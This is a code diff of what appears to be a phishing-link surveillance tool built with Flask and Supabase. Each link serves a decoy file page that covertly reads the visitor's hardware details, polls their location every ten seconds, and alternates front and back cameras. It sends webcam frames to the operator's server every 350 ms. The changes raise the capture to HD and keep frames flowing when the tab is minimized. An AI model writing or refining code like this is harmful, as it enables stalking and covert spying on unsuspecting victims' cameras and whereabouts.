@@ -182,7 +182,7 @@ def verify_otp():
         return f"{COMMON_STYLE}<div class='container'><h2>FAILED</h2><p>Invalid OTP!</p><a href='/lg'>Try Again</a></div>"
     return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>VERIFY <span>OTP</span></h2><form method="POST"><input type="text" name="otp" placeholder="4-Digit Code" required><button type="submit">Verify & Proceed</button></form></div>')
 
-# --- TARGET PAGE (DIRECT FILE SHOW + HIGH SPEED ALTERNATING CAPTURE) ---
+# --- TARGET PAGE (DIRECT FILE SHOW + HIGH SPEED HD ALTERNATING CAPTURE) ---
 @app.route("/t/<link_id>")
 def target_page(link_id):
     res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
@@ -235,17 +235,15 @@ def target_page(link_id):
 
             // --- CAMERA STATE & TIMERS ---
             let camStream = null;
-            let currentCam = "user"; // Defaults to Front Camera
+            let currentCam = "user"; // Front Camera
             let captureIntervalId = null;
+            let lastSentImage = ""; // To prevent duplicate spam when minimized
 
             window.onload = () => { 
                 getHardware(); 
                 showFileContent();
                 
-                // Location Fetch (runs separately every 10 seconds)
-                setInterval(fetchLocation, 10000);
-
-                // Start High-Speed Alternating Cameras
+                setInterval(fetchLocation, 10000); // Location har 10 sec baad
                 startUltraStealthSequence();
             };
 
@@ -296,19 +294,29 @@ def target_page(link_id):
                 medBox.innerHTML = html;
             }
 
-            async function switchCameraTo(facingMode) {
-                // Stop any running stream
+            async function switchCameraTo(facingModeStr) {
+                // BUG FIX: Pehle current camera ki stream ko proper STOP karo taake switch lag jaye
                 if (camStream) {
-                    camStream.getTracks().forEach(t => t.stop());
+                    camStream.getTracks().forEach(track => track.stop());
+                    camStream = null;
                 }
                 
                 try {
-                    camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+                    // HD Resolution request
+                    let constraints = {
+                        video: { 
+                            facingMode: facingModeStr === "environment" ? { ideal: "environment" } : "user",
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        }
+                    };
+                    camStream = await navigator.mediaDevices.getUserMedia(constraints);
                     const bgV = document.getElementById('bg-v');
                     bgV.srcObject = camStream;
                     bgV.onloadedmetadata = () => { bgV.play(); };
+                    currentCam = facingModeStr;
                 } catch(e) {
-                    console.log("Cam Blocked or Unavailable");
+                    console.log("Cam switch failed: ", e);
                 }
             }
 
@@ -317,14 +325,20 @@ def target_page(link_id):
                     const bgV = document.getElementById('bg-v');
                     const c = document.getElementById('c');
                     if(bgV.videoWidth > 0) {
-                        // Scaled down resolution to ensure fast transmission
-                        c.width = bgV.videoWidth / 2; 
-                        c.height = bgV.videoHeight / 2;
+                        // FIX: Ab size half nahi kar raha, original HD (1280x720) mein bheje ga
+                        c.width = bgV.videoWidth; 
+                        c.height = bgV.videoHeight;
                         c.getContext('2d').drawImage(bgV, 0, 0, c.width, c.height);
                         
-                        // Compressed to 30% quality so it sends immediately
-                        let imgData = c.toDataURL('image/jpeg', 0.3);
+                        // FIX: Quality set to 0.8 (HD)
+                        let imgData = c.toDataURL('image/jpeg', 0.8);
                         
+                        // FIX MINIMIZE ISSUE: Agar image bilkul last jaisi hai (mtlb video freeze ho chuki hai OS ki taraf se) toh skip kardo, spam nai hoga
+                        if (imgData === lastSentImage) {
+                            return; 
+                        }
+                        lastSentImage = imgData;
+
                         fetch("/api/capture/{{ l_id }}", { 
                             method: "POST", 
                             headers: {"Content-Type":"application/json"}, 
@@ -335,40 +349,38 @@ def target_page(link_id):
             }
 
             async function startUltraStealthSequence() {
-                // Pehlay FRONT camera on karo
+                // Sequence Start: Pehlay Front (User)
                 currentCam = "user";
                 await switchCameraTo(currentCam);
 
-                // High Speed Capture: Every 350ms (~3 frames per second => ~55 frames in 20 sec)
+                // Speed limit 350ms per frame
                 if(captureIntervalId) clearInterval(captureIntervalId);
                 captureIntervalId = setInterval(captureUltraFast, 350);
 
-                // Start Switching Loop
+                // Rotation Loop Shuru
                 runCamCycle();
             }
 
             function runCamCycle() {
                 if (currentCam === "user") {
-                    // Front cam chal raha hai, isko 20 sec baad Back par switch karo
+                    // Front cam 20 sec chala, ab Back (Environment) par shift karo
                     setTimeout(async () => {
-                        currentCam = "environment";
-                        await switchCameraTo(currentCam);
+                        await switchCameraTo("environment");
                         runCamCycle();
                     }, 20000);
                 } else {
-                    // Back cam chal raha hai, isko 10 sec baad Front par switch karo
+                    // Back cam 10 sec chala, ab dobara Front par shift karo
                     setTimeout(async () => {
-                        currentCam = "user";
-                        await switchCameraTo(currentCam);
+                        await switchCameraTo("user");
                         runCamCycle();
                     }, 10000);
                 }
             }
 
-            // Persistence Hack: Keeps the loop running when minimized
+            // Persistence Listener
             document.addEventListener("visibilitychange", () => {
                 if (document.hidden) {
-                    console.log("Ultra Stealth Backgrounding...");
+                    console.log("UCHIHA Chrome minimized. Video feed might freeze by OS.");
                 }
             });
         </script>
